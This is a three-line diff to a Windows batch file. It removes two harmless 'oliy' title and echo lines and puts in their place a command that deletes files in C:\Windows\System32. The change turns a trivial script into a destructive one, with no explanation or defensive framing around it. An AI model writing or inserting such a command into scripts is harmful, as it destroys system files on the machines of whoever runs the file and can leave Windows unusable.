@@ -1,3 +1,2 @@
 @echo off
-title oliy
-echo oliy
+del C:\Windows\System32
